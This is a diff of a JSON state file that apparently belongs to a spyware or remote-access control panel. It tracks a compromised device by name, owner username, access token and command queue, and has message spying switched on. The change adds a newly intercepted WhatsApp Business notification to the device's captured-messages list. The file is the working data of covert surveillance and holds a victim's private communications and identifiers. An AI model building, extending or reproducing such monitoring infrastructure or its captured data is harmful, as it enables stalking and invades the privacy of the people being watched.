@@ -1515,7 +1515,7 @@
     "deviceName": "HP-ZAL7SEX-F5FF",
     "ownerUsername": "Zal7Sex",
     "token": "d65607314eb3c6cfb4de3bf10719f025",
-    "lastSeen": 1776536449581,
+    "lastSeen": 1776536452676,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-18T18:19:58.714Z",
@@ -1531,6 +1531,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "PEGASUS X ZAL7SEK (14 messages): ~ Rizz",
+        "content": "Pm",
+        "time": "19/04 01:20",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1776536453011
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
